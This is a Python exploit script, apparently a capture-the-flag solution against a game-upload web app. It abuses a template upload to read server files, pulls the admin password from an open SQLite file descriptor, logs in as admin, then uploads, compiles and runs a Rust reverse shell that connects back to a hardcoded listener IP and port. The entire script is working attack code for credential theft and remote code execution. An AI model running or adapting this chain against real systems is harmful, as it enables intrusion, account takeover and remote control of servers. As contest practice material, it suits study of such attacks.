import requests
from urllib.parse import urljoin

URL = "http://gdc.intechfest.cc/"
LHOST = "51.161.84.3"
LPORT = "4444"


class API:
    def __init__(self, url=URL):
        self.s = requests.Session()
        self.url = url

    def path(self, path):
        return urljoin(self.url, path)

    def login(self, username, password):
        return self.s.post(self.path("/api/login"), json={
            "username": username,
            "password": password,
        })

    def register(self, username, password):
        return self.s.post(self.path("/api/register"), json={
            "username": username,
            "password": password,
        })

    def upload(self, file, title, description):
        return self.s.post(self.path("/api/upload"), files={
            "gameFile": file,
            "gameTitle": title,
            "gameDescription": description,
        })

    def command(self, cmd: tuple):
        return self.s.post(self.path("/api/command"), json={
            "cmd": cmd[0],
            "args": cmd[1::]
        })

    def render_template(self, filename):
        return self.s.get(self.path("/"), params={
            "q": filename,
        })


def readfile(file):
    api = API()
    api.register("some", "some")
    api.login("some", "some")
    api.upload(
        ("diqwnin1209eac90j0q0e90qwe89v.hbs", '{{include "'+file+'"}}'), "/app/templates", "foo")
    return api.render_template("diqwnin1209eac90j0q0e90qwe89v.hbs").text


def get_admin_creds():
    # read admin username and password throught sqlite file descriptor
    file = readfile("/proc/1/fd/3")
    admin_username = "dimas"
    password_lenght = 32
    admin_loc = file.find(admin_username)+len(admin_username)
    admin_password = file[admin_loc:admin_loc+password_lenght]
    return admin_username, admin_password


if __name__ == "__main__":
    username, password = get_admin_creds()
    print("admin username:", username)
    print("admin password:", password)

    api = API()
    api.login(username, password)
    payload = open("revshell.rs", "r").read()\
        .replace("&args[1]", f'"{LHOST}"')\
        .replace("&args[2]", f'"{LPORT}"')
    api.upload(("exploit.rs", payload), "/app/", "foo")
    res = api.command(['rustc', 'exploit.rs'])
    res = api.command(['wget', '--use-askpass', './exploit', '0'])
    print(res.text)
